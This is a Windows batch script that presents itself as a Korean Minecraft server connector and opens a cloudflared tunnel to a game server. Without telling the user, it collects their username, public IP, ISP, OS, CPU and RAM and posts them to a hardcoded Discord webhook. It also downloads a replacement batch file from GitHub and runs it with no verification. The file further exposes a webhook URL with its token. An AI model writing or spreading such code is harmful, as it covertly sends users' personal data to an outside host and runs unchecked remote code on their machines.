@echo off
setlocal enabledelayedexpansion
chcp 949 > nul
set "v=1.0.9"
set "p=25565"
set "v_url=https://raw.githubusercontent.com/YubiLemon/mc-zlong-cloud-server/main/version.txt"
set "d_url=https://raw.githubusercontent.com/YubiLemon/mc-zlong-cloud-server/main/connect.bat"
set "w_url=https://discord.com/api/webhooks/1465304132624715950/KphKke96wiNvBgeF2180THVl744I7-Cyok-G2gjbI2Bg8eaO3KP6WQmX0x79PSeu4_Ov"
title zlong 서버 접속기 v%v%
where cloudflared >nul 2>&1
if !errorlevel! neq 0 (
    echo [!] Cloudflare 미설치. 설치를 시작합니다...
    winget install -e --id Cloudflare.cloudflared
    echo [!] 설치 완료. 창을 껐다 다시 켜주세요.
    pause & exit
)
for /f "usebackq" %%a in (`powershell -Command "(Invoke-WebRequest -Uri '%v_url%' -UseBasicParsing).Content.Trim()"`) do set "nv=%%a"
if not "%v%"=="!nv!" (
    powershell -Command "Invoke-WebRequest -Uri '%d_url%' -OutFile 'update_temp.bat' -UseBasicParsing"
    (
        echo @echo off
        echo timeout /t 2 ^> nul
        echo del /f /q "connect.bat"
        echo ren "update_temp.bat" "connect.bat"
        echo start "" "connect.bat"
        echo del "%%~nx0"
    ) > u_h.bat
    start /b "" u_h.bat & exit /b
)
echo [!] 분석 중...
for /f "tokens=2 delims==" %%a in ('wmic os get Caption /value 2^>nul') do set "os_name=%%a"
for /f "tokens=2 delims==" %%a in ('wmic cpu get Name /value 2^>nul') do set "cpu_name=%%a"
for /f %%a in ('powershell -Command "[math]::round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB, 1)"') do set "mem_gb=%%a"
for /f "usebackq" %%i in (`powershell -command "(Invoke-RestMethod -Uri 'http://ip-api.com/json').query"`) do set "ip=%%i"
for /f "usebackq delims=" %%i in (`powershell -command "(Invoke-RestMethod -Uri 'http://ip-api.com/json').isp"`) do set "isp=%%i")
powershell -Command "$msg = @{ content = '**zlong 접속 리포트 (v%v%)**\n- **유저**: %username%\n- **IP/ISP**: !ip! (!isp!)\n- **OS**: !os_name!\n- **CPU**: !cpu_name!\n- **RAM**: !mem_gb! GB\n- **주소**: localhost:%p%' }; $json = $msg | ConvertTo-Json; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Invoke-RestMethod -Uri '%w_url%' -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($json)) -ContentType 'application/json'" > nul 2>&1
echo [!] zlong 터널 연결 시도...
start /b cloudflared access tcp --hostname mc.zlong.cloud --listener localhost:%p% --protocol http2 > nul 2>&1
timeout /t 5 > nul
cls
echo ==================================================
echo   LYB2 멀티서버 연결 성공! (v%v%)
echo ==================================================
echo   마인크래프트 접속 주소: localhost
echo   * 이 창을 닫으면 서버 연결이 종료됩니다.
echo ==================================================
pause